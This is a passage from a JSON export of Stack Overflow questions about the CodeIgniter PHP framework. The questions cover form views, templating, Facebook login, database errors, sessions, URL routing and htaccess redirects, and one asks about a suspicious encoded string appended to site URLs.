red;\"&gt;&lt;?php echo form_error($password['name']); ?&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_label('Confirm Password', $confirm_password['id']); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_password($confirm_password); ?&gt;&lt;/td&gt;\n                &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($confirm_password['name']); ?&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_label('Date of Birth', $dob1['id']); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_input($dob1); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_input($dob2); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_input($dob3); ?&gt;&lt;/td&gt;\n                &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($dob1['name']); ?&gt;&lt;?php echo isset($errors[$dob1['name']])?$errors[$dob1['name']]:''; ?&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n\n        &lt;?php if ($captcha_registration) {\n                if ($use_recaptcha) { ?&gt;\n        &lt;tr&gt;\n                &lt;td colspan=\"2\"&gt;\n                        &lt;div id=\"recaptcha_image\"&gt;&lt;/div&gt;\n                &lt;/td&gt;\n                &lt;td&gt;\n                        &lt;a href=\"javascript:Recaptcha.reload()\"&gt;Get another CAPTCHA&lt;/a&gt;\n                        &lt;div class=\"recaptcha_only_if_image\"&gt;&lt;a href=\"javascript:Recaptcha.switch_type('audio')\"&gt;Get an audio CAPTCHA&lt;/a&gt;&lt;/div&gt;\n                        &lt;div class=\"recaptcha_only_if_audio\"&gt;&lt;a href=\"javascript:Recaptcha.switch_type('image')\"&gt;Get an image CAPTCHA&lt;/a&gt;&lt;/div&gt;\n                &lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n                &lt;td&gt;\n                        &lt;div class=\"recaptcha_only_if_image\"&gt;Enter the words above&lt;/div&gt;\n                        &lt;div class=\"recaptcha_only_if_audio\"&gt;Enter the numbers you hear&lt;/div&gt;\n                &lt;/td&gt;\n                &lt;td&gt;&lt;input type=\"text\" id=\"recaptcha_response_field\" name=\"recaptcha_response_field\" /&gt;&lt;/td&gt;\n                &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error('recaptcha_response_field'); ?&gt;&lt;/td&gt;\n                &lt;?php echo $recaptcha_html; ?&gt;\n        &lt;/tr&gt;\n        &lt;?php } else { ?&gt;\n        &lt;tr&gt;\n                &lt;td colspan=\"3\"&gt;\n                        &lt;p&gt;Enter the code exactly as it appears:&lt;/p&gt;\n                        &lt;?php echo $captcha_html; ?&gt;\n                &lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_label('Confirmation Code', $captcha['id']); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_input($captcha); ?&gt;&lt;/td&gt;\n                &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($captcha['name']); ?&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n&lt;?php }\n        } ?&gt;\n&lt;/table&gt;\n&lt;?php echo form_submit('register', 'Register'); ?&gt;\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>**ALSO: If you know how to change the width of the td tag for the registration_form.php then please let me know. I am struggling with that also the simple  does not work.</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1474,"score":1,"question_id":5467393,"title":"Add dynamic content to a template in code igniter","body":"<p>I am trying a HTML/CSS file to convert to a template. I asked for help but I didn't receive any suggestions in that post yet I tried to figure out a way to create a template. I am having few glitches in doing that. My controller has main.php file which is the main page of the website, and I have register where the header, footer, and rest remain same except that main content changes when the page loads.</p>\n\n<p>I have the following template in the views folder:</p>\n\n<pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\n   \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"&gt;\n&lt;head&gt;\n   &lt;title&gt;&lt;?= $title ?&gt;&lt;/title&gt;\n\n   &lt;style type=\"text/css\"  &gt;\n       @import url('&lt;?=base_url()?&gt;/includes/front.css');\n       @import url('&lt;?=base_url()?&gt;/images/');\n   &lt;/style&gt;\n\n&lt;/head&gt;\n&lt;body&gt;\n   &lt;div id=\"container\"&gt;\n       &lt;div id=\"header\"&gt;\n            &lt;?= $logo ?&gt; &lt;!--This is an image tag to display the image on the template --&gt;\n            &lt;?= $topnav ?&gt;\n       &lt;/div&gt;\n\n       &lt;div id=\"menubar\"&gt;\n            &lt;?= $menulist ?&gt;\n       &lt;/div&gt;\n\n       &lt;div id=\"maincontent\"&gt;\n           &lt;?= $flashcontent ?&gt;\n           &lt;?= $resources ?&gt;\n           &lt;?= $registerForm ?&gt;\n       &lt;/div&gt;\n\n       &lt;div id=\"footer\"&gt;\n           &lt;div&gt;\n               &lt;?= $footertable1 ?&gt;\n           &lt;/div&gt;\n       &lt;/div&gt;\n   &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>In the       </p>\n\n<blockquote>\n  <p>div id = maincontent</p>\n</blockquote>\n\n<p>This is the div tag which would be changing when a site loads. In my template I have included &lt;</p>\n\n<pre><code>&lt;?= $flashcontent ?&gt; &lt;?= $resource ?&gt; and  &lt;?= registerForm ?&gt;\n</code></pre>\n\n<p>The flashcontent and resources are supposed to be in the main page and registerForm is supposed to be shown when I click on register in the main page. I have been reading the template user guide in the code igniter but I am unable to understand how to make this dynamic. Please help me in getting over this issue.</p>\n\n<p>This is the template.php in config folder. </p>\n\n<pre><code>$template['active_group'] = 'default';\n$template['default']['template'] = 'template.php';\n$template['default']['regions'] = array(\n   'title',\n   'logo' =&gt; array(\n        'content' =&gt; array(''),\n        'name' =&gt; 'Logo',\n        'wrapper' =&gt; '&lt;img&gt;',\n        'attributes' =&gt; array('id' =&gt; 'logo')\n    ),\n    'topnav' =&gt; array(\n        'content' =&gt; array(),\n        'name' =&gt; 'Topnav',\n        'wrapper' =&gt; '&lt;div&gt;',\n        'attributes' =&gt; array('id' =&gt; 'topnav', 'class' =&gt; 'topnav')\n    ),\n    'menulist' =&gt; array(\n        'content' =&gt; array('&lt;li&gt;\n                            &lt;a href=\"#\"&gt; Home &lt;/a&gt;\n                            &lt;a href=\"#\"&gt; Generator &lt;/a&gt;\n                            &lt;a href=\"#\"&gt; News &lt;/a&gt;\n                            &lt;a href=\"#\"&gt; Forum &lt;/a&gt;\n                            &lt;a href=\"#\"&gt; About &lt;/a&gt;\n                            &lt;a href=\"#\"&gt; Feedback &lt;/a&gt;\n                            &lt;/li&gt;'),\n        'name' =&gt; 'Menulist',\n        'wrapper' =&gt; '&lt;ul&gt;',\n        'attributes' =&gt; array('class' =&gt; 'menulist')\n    ),\n   'flashcontent' =&gt; array(\n       'content' =&gt; array(''),\n       'name' =&gt; 'Flashcontent',\n       'wrapper' =&gt; '&lt;div&gt;',\n       'attributes' =&gt; array('id' =&gt; 'flashcontent')\n   ),\n    'resources' =&gt; array(\n       'content' =&gt; array(''),\n       'name' =&gt; 'Resources',\n       'wrapper' =&gt; '&lt;div&gt;',\n       'attributes' =&gt; array('id' =&gt; 'resources')\n   ),\n    'registerForm' =&gt; array(\n      'content' =&gt; array(),\n        'name' =&gt; 'Registerform',\n        'wrapper' =&gt; '&lt;div&gt;',\n        'attributes' =&gt; array('id' =&gt; 'registerForm')\n    ),\n   'footertable1' =&gt; array(\n       'content' =&gt; array('&lt;ul&gt; \n                            &lt;li&gt; &lt;a href=\"../main\"&gt;Home&lt;/a&gt;\n                            &lt;a href=\"#\"&gt;News &amp; Events&lt;/a&gt;\n                            &lt;a href=\"#\"&gt;Forum&lt;/a&gt;\n                            &lt;a href=\"#\"&gt;About us&lt;/a&gt;\n                            &lt;a href=\"#\"&gt;Contact us&lt;/a&gt;\n                            &lt;a href=\"#\"&gt;Terms of use&lt;/a&gt;\n                            &lt;a href=\"#\"&gt;Privacy policy&lt;/a&gt;\n                            &lt;a href=\"#\"&gt;Site map&lt;/a&gt;\n                            &lt;/li&gt;\n                           &lt;/ul&gt;'),\n       'name' =&gt; '',\n       'wrapper' =&gt; '&lt;div&gt;',\n       'attributes' =&gt; array('id' =&gt; 'footertable1')\n   )\n);\n$template['default']['parser'] = 'parser';\n$template['default']['parser_method'] = 'parse';\n$template['default']['parse_template'] = FALSE;\n</code></pre>\n\n<p>Thanks in advance. </p>\n"},{"tags":["php","css","codeigniter","frameworks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12392678,"title":"CSS doesn't want to be uploaded from another controller","body":"<p>I have some headers and footers that have <code>CSS</code> in them, and when I load the view in a controller, the <code>CSS</code> displays just fine.</p>\n\n<p>However, when I use another controller to load the same view, the <code>CSS</code> does not show up. </p>\n\n<p>Why does the <code>CSS</code> file not get displayed when I call it later in the controller?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":170,"score":1,"question_id":8910080,"title":"codeigniter with PHP Report Maker?","body":"<p>Has anyone used this combination and how? kindly explain how can I use <a href=\"http://www.hkvstore.com/phpreportmaker/\" rel=\"nofollow\">PHP Report Maker</a> with CodeIgniter. Thanks.</p>\n"},{"tags":["facebook","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12386074,"title":"How to specify a thumbnail when sharing to Facebook?","body":"<p>I ave embedded youtube video on my CodeIgniter page, i'm using official youtube embedding code: </p>\n\n<pre><code>&lt;iframe width=\"560\" height=\"315\" src=\"http://www.youtube.com/embed/msHFJhMqaKI\" frameborder=\"0\" allowfullscreen=\"\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>But when I try to share my page into facebook, i have no thumbnail, is there a tag or something what can help me with sign my video as future facebook thumbnail?</p>\n"},{"tags":["php","codeigniter","frameworks","oauth","oauth2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12373354,"title":"Codeigniter + oAuth Service","body":"<p>I am currently looking for a some tutorials or guides on how to implement <strong>your own oAuth service with codeigniter.</strong></p>\n\n<p>The only ressource I´ve seen so far is <a href=\"https://github.com/alexbilbie/CodeIgniter-OAuth-2.0-Server/\" rel=\"nofollow\">alexbilbie github oAuth2 Server </a></p>\n\n<p>repository is <strong>down..</strong>.</p>\n\n<p>Does anyone have some guides/tutorials on this?\nThanks</p>\n"},{"tags":["php","facebook","codeigniter","facebook-php-sdk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":224,"score":0,"question_id":12386563,"title":"Facebook login using PHP SDK","body":"<p>I am trying to login with FB using codeigniter &amp; the FB PHP SDK.</p>\n\n<p>but it keeps giving me the same login with facebook link, it's not catching if the user is logged in, Am I missing anything like sessions or something? </p>\n\n<p>And since we are at it how can I get the extended session &amp; what data should I save to publish to pages while user is offline?</p>\n\n<p>here is my controller:</p>\n\n<pre><code>function __construct () {\n    parent::__construct();      \n    $this-&gt;load-&gt;helper('url_helper');\n    $this-&gt;load-&gt;add_package_path(APPPATH.'third_party/facebook/');\n    $this-&gt;config-&gt;load('facebook', TRUE);\n    $this-&gt;load-&gt;library('facebook', array( 'appId'  =&gt; $this-&gt;config-&gt;item('appId', 'facebook'), 'secret' =&gt; $this-&gt;config-&gt;item('secret', 'facebook') ) );\n}\n\npublic function index() {\n    $data['LoginURL']   = $this-&gt;facebook-&gt;getLoginUrl( array('scope' =&gt; 'manage_pages') );\n    $data['user']       = $this-&gt;facebook-&gt;getUser();\n    if ($data['user']) {\n      try {\n        $data['user_profile']   = $this-&gt;facebook-&gt;api('/me');\n        $data['AccessToken']    = $this-&gt;facebook-&gt;getAccessToken();\n      } catch (FacebookApiException $e) {\n        // The access token we have is not valid\n        $data['user'] = null;\n      }\n    }\n    $this-&gt;load-&gt;view('fb_welcome', $data);\n}\n</code></pre>\n\n<p>And here is the view:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html xmlns:fb=\"http://www.facebook.com/2008/fbml\"&gt;\n&lt;body&gt;\n&lt;?php if ( $user ): ?&gt;      \n    User &lt;em&gt;&lt;?php echo $user ?&gt;&lt;/em&gt; is Logged in, AccessToken is &lt;?php echo $AccessToken; ?&gt;\n    &lt;?php print_r($user_profile); ?&gt;\n&lt;?php else: ?&gt;\n    &lt;?php echo anchor($LoginURL, \"Login with facebook\"); ?&gt;\n&lt;?php endif; ?&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["php","sql","sql-server","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":545,"score":0,"question_id":5230308,"title":"CodeIgniter MsSQL Database error","body":"<p>Hi I am working on a project on CodeIgniter + MsSQL.</p>\n\n<p>I am getting one DB error while trying to insert data to a table. But when I execute the same query directly on MS Sql, it works. The following is the error and query:</p>\n\n<blockquote>\n  <p>A Database Error Occurred</p>\n</blockquote>\n\n<pre><code>Error Number:\nThe statement has been terminated.\nINSERT INTO TBL_POS_Customer (customer_name, customer_address, customer_zip, customer_city, customer_state, customer_dist_country, country_iso, country_subdivision_code, zone_code, customer_zip_code_status, customer_country_status, mainname, country_division_code) VALUES ('A.C.E.I. SPRL', '', '6001', '', '', 'BE', '', 'HT', '', '0', '1', 0, 'HT')\nFilename: D:\\Apache2.2\\htdocs\\POS\\system\\database\\DB_driver.php\nLine Number: 330\n</code></pre>\n"},{"tags":["codeigniter","error-handling"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12383288,"title":"Codeigniter global error override","body":"<p>Is there a way in Codeigniter to override global errors. For instance if an DB error or PHP critical occurs it wont show the error itself but something like 'Our admin guy is fixing the issue' and the error is just logged and emailed.</p>\n"},{"tags":["codeigniter","codeigniter-2","scaffolding","mvcscaffolding"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":202,"score":0,"question_id":12383953,"title":"Scaffolding error with CodeIgniter_2.1.2","body":"<p>I am using codeigniter 2.1.2 and I want to use scaffolding feature to add information to table. When I set this <code>$route['scaffolding_trigger'] = 'scaffolding';</code> in routes.php and call it in controller  <code>$this-&gt;load-&gt;scaffolding('applicants');</code> I get the following Error:<br/>\n<b>Fatal error: Call to undefined method CI_Loader::scaffolding() in C:\\xampp\\htdocs\\hmplatform\\application\\controllers\\Applicant.php on line 6</b> So I am asking if I can find a library that contains scaffolding features because in this version I downloaded from GIT there is no scaffolding folder.</p>\n"},{"tags":["codeigniter","codeigniter-2","friendly-url","codeigniter-url","codeigniter-routing"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":62,"score":-1,"question_id":12379050,"title":"How to make urls like category/5/sub_category in CodeIgniter","body":"<p>I want my urls to look like:</p>\n\n<p><code>www.domain.com/catalog/category_name/category_id/product_name/product_id</code>.</p>\n\n<p>How should my controllers look like to accomplish this?</p>\n\n<p>It's ok for the Controller to have Catalog and Function category_name in it.</p>\n\n<p>But what will be my product controller and function. How can I make a structure like this.\nDo I  need to have a specific file structure?</p>\n\n<p>I use CodeIgniter framework. Thanks for your help.</p>\n"},{"tags":["php","codeigniter","session","frameworks","tracking"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":148,"score":0,"question_id":11581895,"title":"Track number of users online using Codeigniter (v2)","body":"<p>I am using Codeigniter 2 and would like to track the number of current users on a site into the database. I know this can be achieved using the built-in session class but I am unsure of what I am doing wrong - I've created the ci_sessions table in MySQL and set the following in the config - do I need to make any other adjustments to auto record sessions into the database when someone visits the site?</p>\n\n<pre><code>$config['sess_cookie_name']     = 'ci_session';\n$config['sess_expiration']      = 7200;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = TRUE;\n$config['sess_table_name']      = 'ci_sessions';\n$config['sess_match_ip']        = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 300;\n</code></pre>\n"},{"tags":["php","html","codeigniter"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1237,"score":2,"question_id":3357371,"title":"CodeIgniter: How to 'highlight' the link of the page the user is currently on?","body":"<p>Fairly new to CodeIgniter, still grasping the MVC approach. I'm just wondering what's the best way to solve this:</p>\n\n<p>I got my navigation bar highlighting the currently active link like so:</p>\n\n<pre><code>&lt;a href=\"index.hml\" id=\"active\"&gt;Index&lt;/a&gt;\n&lt;a href=\"blog.hml\"&gt;Blog&lt;/a&gt;\n</code></pre>\n\n<p>Now, when I go to blog.html I want id=\"active\" to shift accordingly.\nUsually I'd assign a variable to each link and then set it's value to 'id=\"active'.\nSomehow I don't think that's the best way.\nAny thoughts?</p>\n\n<p><strong>Update (12. Sept 2012)</strong> Since asking this I've moved on to Kohana and expanded a module created entirely for this purpose. Now, all I need to do is specify my menu items in a config array and the highlighting happens automagically. The module is <a href=\"https://github.com/anroots/kohana-menu\" rel=\"nofollow\">here</a>.</p>\n"},{"tags":["php","validation","codeigniter","post","get"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":208,"score":0,"question_id":11927690,"title":"How can I quickly check if GET and POST variables in CodeIgniter are both set and numeric?","body":"<p>How can I quickly validate if a <code>GET</code> or <code>POST</code> variable in CodeIgniter is both set and numeric for use as error or status messages in views?</p>\n\n<p>It is very tedious to do something like this each time each time I want to check variables:</p>\n\n<pre><code>if ($this-&gt;input-&gt;get('error', True)) {\n    if (is_numeric($this-&gt;input-&gt;get('error', True))) {\n        $data['error'] = $this-&gt;input-&gt;get('error', True);\n    }\n}\n</code></pre>\n"},{"tags":["regex",".htaccess","codeigniter","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12351085,"title":"Change specific string in URL with htaccess and regex","body":"<p>Could you please help me to write .htaccess rewrite rule that will rewrite one string in URL to another (in this case user -> profile):</p>\n\n<p>eg: <a href=\"http://my.site.com/index.php/user/194/\" rel=\"nofollow\">http://my.site.com/index.php/user/194/</a></p>\n\n<p>It should be like this to work</p>\n\n<p>eg: <a href=\"http://my.site.com/index.php/profile/194/\" rel=\"nofollow\">http://my.site.com/index.php/profile/194/</a></p>\n\n<p>It should also change all \"user\" words to \"profile\", not just the first.</p>\n\n<p>I have tried with the following code but it is not working for some reason:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^user=([^&amp;]*) [NC]\nRewriteRule ^ %{REQUEST_URI}?profile=%1 [R=301,L]\n</code></pre>\n\n<p>Please assist. Thank you all in advance. </p>\n"},{"tags":["codeigniter"],"answer_count":5,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":4776,"score":3,"question_id":2000621,"title":"Codeigniter: How to redirect properly with form validation","body":"<p>I understand how to do it w/ a plain form w/o existing values, but let's say I have a view that I can call via <a href=\"http://domain.com/account/settings\" rel=\"nofollow\">http://domain.com/account/settings</a>. let's say I have two fields, username, password and city, which are all pulled from the DB (except for password of course). So, if a user tries to submit the form and fails validation for whatever reason, where should I \"redirect\" them to? Right now, I have it showing the same view but the problem is, it pulls the info from the DB again. Should I be creating two different views?</p>\n\n<p>The second view would essentially show the information they tried to enter along w/ the error message.</p>\n"},{"tags":["codeigniter","jqgrid","csrf-protection"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":216,"score":1,"question_id":10511521,"title":"Codeigniter with jqGrid: use csrf_token","body":"<p>I'm new in jqGrid so i'm not able to connect  Codeigniter  with jqGrid. I faced with the problem of using csrf_token. </p>\n\n<p>If in config file i set FALSE to 'csrf_token' - everything ok, but when 'csrf_token' TRUE my grid can only get data from database, but not update or anything else. I'm looking through the posts on this site about Сodeigniter+jqGrid but still not understand what should i do. I can get the value of csrf_token but where it should be included?</p>\n\n<pre><code>var lastsel;  \nvar addl_params =\n{\n    ci_csrf: $.cookie('ci_csrf_token')\n\n};\n\n $(\"#grid\").jqGrid({\n  url:'url to script',\n  datatype: \"json\",\n  mtype: 'GET',\n  colNames:['id', 'Nickname', 'Breed'],\n  colModel:[\n            {name:'id',index:'id', width:55, sortable:false, editable:false, \n            editoptions:{readonly:true,size:10}}, \n            {name:'nickname',index:'nickname', width:100,editable:true, \n            edittype:\"text\"},\n            {name:'breed',index:'breed', width:100,editable:true, edittype:\"text\"},\n             ],\n jsonReader : {\n  root:\"rows\",\n  page: \"page\",\n  total: \"totalpages\",\n  records: \"records\"\n },\n  rowNum:10,\n  rowList:[10,20,30],\n  pager: jQuery('#gridpager'),\n  sortname: 'nickname',\n  viewrecords: true,\n  sortorder: \"asc\",\n  caption:\"Cats\",\n\n    onSelectRow: function(id){\n    if(id &amp;&amp; id!==lastsel){\n        jQuery('#grid').jqGrid('restoreRow',lastsel);\n        jQuery('#grid').jqGrid('editRow',id,true,null, null);\n        lastsel=id;\n    }\n},\n  editurl:\"edit-url\"\n</code></pre>\n\n<p>}).navGrid('#gridpager');</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":241,"score":1,"question_id":10784496,"title":"How do I flush memory use in CodeIgniter","body":"<p>I am facing problem of site break down. Since this is the site related to photos. It’s using almost 95% of memory of server. When it reaches to 100% the site is down.\nI checked from the profiler, and get following details: </p>\n\n<pre><code>Loading Time: Base Classes   0.0404\nController Execution Time ( Events / Get Series Images )  10.7655\nTotal Execution Time   10.8061\n\nMEMORY USAGE : 3,948,864 bytes\n</code></pre>\n\n<p>For detail please see the attached file.</p>\n\n<p>Here data are fetched from <strong>Progress server using JSON</strong>. I am surprise what made it so.\nBut in my mind one thing hunt, why not to free the memory when work is done?\nI went to different forum of CI but could not get the answer.</p>\n\n<p>I tried to use <strong>ob_end_flush(), ob_flush()</strong>,.. but could not get desire result.\nI am too is unaware about how to use in CI.</p>\n\n<p>I hope I am able to clear my problem.\nThank you in advance for the support.</p>\n\n<p>I am using HMVC.</p>\n\n<p>CODE</p>\n\n<pre><code>// controller\n    public function get_event_images(){    \n        // pagination\n        $data['current_page'] = @$_GET['page']?@$_GET['page']:1;\n\n        $data['event_id'] = $this-&gt;uri-&gt;segment(3);   \n        $data['event_name'] = urldecode($this-&gt;uri-&gt;segment(4));  \n        $url = JSON_URL.\"jsread.p?call=treeimg&amp;user=&amp;lang=en&amp;tree=\".$data['series_id'].\"&amp;sort=last&amp;max=\".MAX_RECORD.\"&amp;startpage=\".$data['current_page'].\"&amp;pagesize=\".PAGE_SIZE;         \n        $json_formated_data =  readJSONURL($url);  \n\n        //extract array of images only\n        $data['images'] = getData($json_formated_data);\n\n        $image_stat = getImageStat($json_formated_data);\n        $data['total_images']= $image_stat[6];  \n        $data['total_rows'] = $image_stat[5];\n\n        $data['main_content'] = 'eventimages';  \n        $data['title'] = \"Event Images\";\n\n        // store series details in session\n        $newdata = array(\n            'event_id'  =&gt;$data['event_id'],\n            'event_name'=&gt; $data['event_name']\n        );\n        $this-&gt;session-&gt;set_userdata($newdata);\n\n        $this-&gt;load-&gt;view('ktmevent/template_page', $data);         \n    }\n\n\n\n// view\n    if(!empty($images)):\n        foreach($images as $data):\n            echo  \"&lt;li&gt;\";   \n                echo  \"&lt;div class=\\\"image\\\"&gt;\";  \n                echo \"&lt;a href=\\\"\".site_url('events/image_detail/'.$series_id.\"/\".$data['Photono']).\"\\\"&gt;\";\n                echo \"&lt;img src=\\\"http://www.mysite.com\".$data['Thumburl'].\"\\\" /&gt;\";\n                echo \"&lt;/a&gt;\";\n                echo \"&lt;/div&gt;\";\n                echo \"&lt;div&gt;\";\n                echo anchor('events/image_detail/'.$series_id.'/'.$data['Photono'], 'Detail');\n                echo \"&lt;/div&gt;\";\n            echo \"&lt;/li&gt;\";\n        endforeach;\n    endif;\n</code></pre>\n"},{"tags":["codeigniter","session","header"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12336177,"title":"codeigniter my page correctly displays but header says 404 error","body":"<p>I'm trying to track down why my form's post data isn't being passed to the controller.</p>\n\n<p>When I go to the controller's url, the page displays properly.  But when I open up firebug it says theres a 404 error.</p>\n\n<p>I'm stumped. How can there be a 404 error when the page is being displayed?</p>\n\n<p>I've checked and double-checked everything.  I don't know why this is happening.</p>\n\n<p>UPDATE:  This same thing is happening on all my controller's url's.  When I visit the site, the page displays just fine, but firebug says 404.  I just didn't realize it until now because the other pages aren't accepting any post data.</p>\n\n<p>On the members page, if they're not logged in it redirects.  Here, firebug says 302 temporarily moved, which is what it's supposed to do.  But when I'm logged in and visit the members page it's 404.</p>\n\n<p>I suspect I need to alter the config->router.php file, but I'm not sure how it needs modified.</p>\n"},{"tags":["codeigniter","expressionengine","exploit"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":112,"score":2,"question_id":11429071,"title":"Is this string encoded","body":"<p>I've got a client with a website that uses codeignite and expression engine,</p>\n\n<p>we've got a certain IP address that seems to be crawling through every page link and appending it with the following string and its making the cpu usage go like crazy! the file itself doesnt actually exist so I assume its somebody trying to exploit it.</p>\n\n<pre><code>jl1t6ZrqxJydBuZjJPTjHXNReaeo/kW/rio23/22hzp9CoSkWDSzpjdEpT30ZMub1umPwGV02ZIa8cdz8jfbqCIg1l0d7ymYZpPzskTzHeeckbkiI/qbo5GcoEyuqNzj85CsV5ja0qpf26srnUUPlE8Ta6Y28/BQI2n04r1Q9RBk+MyHguj6OgHoqzCpEifYb0Bf6xr5TtSxuZz+LFTTFWWWR66Br+r6KTQjXIMYXoqS+AGOmzQATKxW+OhZxJOvvNFF2xF4gp2Vhu79A25d8Y/4Q6JwmCowSXaZDiR7DEYgt3wmic2r3XRlvchEMw0VG+ilR4taaT8iS7U9PzXAk9wsxbk2YMkSpW+xMxl3YNDLO7Z+PQHFLFhK4VUVV2oMRF1FCHetFfpqTonRpAW5o8zTxWS/K3YXmHQj5jB0roM=/\n</code></pre>\n\n<p>that so any normal address for instance, /site/contact-us/ would be appended to  </p>\n\n<pre><code>/site/contact-us/jl1t6zrqx......etc\n</code></pre>\n\n<p>does anybody recon that that could be something encoded or what do you think could be going on?</p>\n\n<p>Many Thanks</p>\n"},{"tags":["php","mysql","codeigniter","transactions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12317355,"title":"How can i handle transactions in code igniter using multiple model","body":"<p>I'm trying to implement transactions to maintain atomicity in code igniter. I'm using code igniter models. For modularity and maintenance sake, I have separate models handling separate task related to one table or in some cases multiple related tables.</p>\n\n<p>The problem is I have to implement transactions across two or more models from within a controller action.</p>\n\n<p>like so</p>\n\n<pre><code>//the following is inside a controller\npublic function myaction()\n{\n    transaction_start();\n    first_model-&gt;setSomeData();\n    second_model-&gt;setSomeData();\n    third_model-&gt;setSomeData();\n    transaction_complete();\n}\n</code></pre>\n\n<p>I am working on a mysql database and i have made them tables in the involved models innodb as I understand that engine supports transaction.</p>\n\n<p>The above code structure doesnt seem to work as i deliberate made the second model insert to fail.I expected the three inserts(1 in each of the setsomedata method of the three models) to all fail or all succeed.</p>\n\n<p>I'm open to knowing what i'm doing wrong.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12374755,"title":"Undefined index when returning database results in Codeigniter","body":"<p>I am trying to transfer data over from a Wordpress database into a Codeigniter project. I have a model method that returns a single value, but I keep getting the following:</p>\n\n<blockquote>\n  <p>Message: Undefined index: meta_value</p>\n  \n  <p>Filename: models/transfer_model.php</p>\n</blockquote>\n\n<p>Here's the model:</p>\n\n<pre><code> public function get_meta($post_id, $key)\n    {\n        $this-&gt;db-&gt;select('meta_value');\n        $this-&gt;db-&gt;from('wp_postmeta');\n        $this-&gt;db-&gt;where('post_id', $post_id);\n        $this-&gt;db-&gt;where('meta_key', $key);\n        $this-&gt;db-&gt;limit(1);\n\n        $query = $this-&gt;db-&gt;get();\n\n        $row = $query-&gt;row_array();\n\n        return $row['meta_value'];\n    }\n</code></pre>\n\n<p>If I <code>print_r($row);</code>, I get the following:</p>\n\n<pre><code>Array\n(\n    [meta_value] =&gt; The Data\n)\n</code></pre>\n\n<p>How can I stop it from returning this error?</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":127,"score":0,"question_id":12284259,"title":"301 redirect for old pages of the website with codeIgniter","body":"<p>I have just now upgraded one of my static website to a codeIgniter enabled website. I need to redirect the exact domain names of the old website to the new ones to avoid the 404 error. </p>\n\n<ul>\n<li>Old pages > <code>http://example.com/pagename.php</code></li>\n<li>New pages > <code>http://example.com/index.php/home/category_images/9(cat_id)</code></li>\n</ul>\n\n<p>I do not a very high no. of pages so hard coding all the pages directly will not be a problem. I have tried : </p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^http://www.example.com/pagename.php$ http://example.com/index.php/home/category_images/9 [L,R=301]\n</code></pre>\n\n<p>Not working, I have no idea why. <code>mod_rewrite</code> is enable on my apache server. </p>\n\n<p>Also, just for the confirmation please also tell me in which folder I should put this file, I am confused between root dir or Application folder. 